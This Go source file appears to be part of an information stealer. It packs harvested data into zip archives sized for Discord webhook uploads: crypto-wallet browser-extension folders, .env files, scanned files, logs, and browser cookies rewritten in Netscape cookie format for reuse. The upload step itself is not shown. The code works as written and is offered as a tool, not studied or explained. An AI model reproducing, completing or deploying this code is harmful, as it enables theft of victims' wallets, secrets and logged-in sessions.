package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sort"
	"strings"

	"recovery/recovery"
)

const maxDiscordUpload = 24 * 1024 * 1024 // stay under Discord 25MB webhook limit

type archiveEntry struct {
	zipPath  string
	data     []byte
	diskPath string
}

func buildPrimaryArchiveEntries(p *harvestPayload) ([]archiveEntry, error) {
	var entries []archiveEntry

	for name, data := range expandLargeLogParts(buildAllLogFiles(p), maxDiscordUpload/2) {
		entries = append(entries, archiveEntry{zipPath: name, data: data})
	}

	usedFolders := make(map[string]int)
	for _, bundle := range recovery.CollectWalletExtensionBundles() {
		folder := uniqueFolder(walletFolderName(bundle.WalletName, bundle.Browser, bundle.Profile), usedFolders)
		for _, e := range bundle.Entries {
			entries = append(entries, archiveEntry{
				zipPath:  folder + "/" + filepath.ToSlash(e.ZipPath),
				diskPath: e.SourcePath,
			})
		}
	}

	seenEnv := make(map[string]bool)
	entries = appendEnvFileEntries(entries, p, seenEnv)

	if len(entries) == 0 {
		return nil, fmt.Errorf("no harvest data to export")
	}

	sort.Slice(entries, func(i, j int) bool {
		return entries[i].zipPath < entries[j].zipPath
	})
	return entries, nil
}

func buildPrimaryZipChunks(p *harvestPayload) ([][]byte, error) {
	entries, err := buildPrimaryArchiveEntries(p)
	if err != nil {
		return nil, err
	}
	return zipArchiveEntriesChunked(entries, maxDiscordUpload)
}

func buildScannedFilesZipChunks(p *harvestPayload) ([][]byte, error) {
	entries := buildScannedFileEntries(p)
	if len(entries) == 0 {
		return nil, nil
	}
	sort.Slice(entries, func(i, j int) bool {
		return entries[i].zipPath < entries[j].zipPath
	})
	return zipArchiveEntriesChunked(entries, maxDiscordUpload)
}

func walletFolderName(walletName, browser, profile string) string {
	profile = strings.ReplaceAll(profile, " ", "")
	return fmt.Sprintf("%s-%s-%s",
		sanitizeFilename(walletName),
		sanitizeFilename(browser),
		sanitizeFilename(profile),
	)
}

func uniqueFolder(base string, used map[string]int) string {
	if used[base] == 0 {
		used[base] = 1
		return base
	}
	used[base]++
	return fmt.Sprintf("%s-%d", base, used[base])
}

func zipArchiveEntries(entries []archiveEntry) ([]byte, error) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	for _, e := range entries {
		if e.zipPath == "" {
			continue
		}
		w, err := zw.Create(filepath.ToSlash(e.zipPath))
		if err != nil {
			continue
		}
		if len(e.data) > 0 {
			if _, err := w.Write(e.data); err != nil {
				continue
			}
			continue
		}
		if e.diskPath == "" {
			continue
		}
		f, err := os.Open(e.diskPath)
		if err != nil {
			continue
		}
		_, _ = io.Copy(w, f)
		f.Close()
	}

	if err := zw.Close(); err != nil {
		return nil, err
	}
	if buf.Len() == 0 {
		return nil, fmt.Errorf("empty harvest archive")
	}
	return buf.Bytes(), nil
}

func zipArchiveEntriesChunked(entries []archiveEntry, maxBytes int) ([][]byte, error) {
	if len(entries) == 0 {
		return nil, fmt.Errorf("no files to zip")
	}
	if maxBytes <= 0 {
		maxBytes = maxDiscordUpload
	}

	var chunks [][]byte
	batch := make([]archiveEntry, 0, len(entries))

	flush := func(b []archiveEntry) error {
		if len(b) == 0 {
			return nil
		}
		z, err := zipArchiveEntries(b)
		if err != nil {
			return err
		}
		chunks = append(chunks, z)
		return nil
	}

	for _, entry := range entries {
		trial := append(append([]archiveEntry{}, batch...), entry)
		z, err := zipArchiveEntries(trial)
		if err != nil {
			continue
		}
		if len(z) > maxBytes {
			if len(batch) > 0 {
				if err := flush(batch); err != nil {
					return nil, err
				}
				batch = []archiveEntry{entry}
				continue
			}
			chunks = append(chunks, z)
			continue
		}
		batch = trial
	}
	if err := flush(batch); err != nil {
		return nil, err
	}
	if len(chunks) == 0 {
		return nil, fmt.Errorf("failed to build zip chunks")
	}
	return chunks, nil
}

func splitBytesBySize(data []byte, max int) [][]byte {
	if max <= 0 || len(data) <= max {
		return [][]byte{data}
	}
	var out [][]byte
	for len(data) > 0 {
		n := max
		if n > len(data) {
			n = len(data)
		}
		if n < len(data) {
			if idx := bytes.LastIndexByte(data[:n], '\n'); idx > n/2 {
				n = idx + 1
			}
		}
		out = append(out, data[:n])
		data = data[n:]
	}
	return out
}

func cookiesNetscape(p *harvestPayload) []byte {
	if p == nil || p.Result == nil || len(p.Result.Cookies) == 0 {
		return nil
	}
	var b bytes.Buffer
	b.WriteString("# Netscape HTTP Cookie File\n")
	for _, c := range p.Result.Cookies {
		domain := c.Host
		flag := "FALSE"
		if len(domain) > 0 && domain[0] == '.' {
			flag = "TRUE"
		}
		secure := "FALSE"
		if c.Secure {
			secure = "TRUE"
		}
		line := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s\n",
			domain, flag, c.Path, secure, c.ExpiresUTC, c.Name, c.Value)
		b.WriteString(line)
	}
	return b.Bytes()
}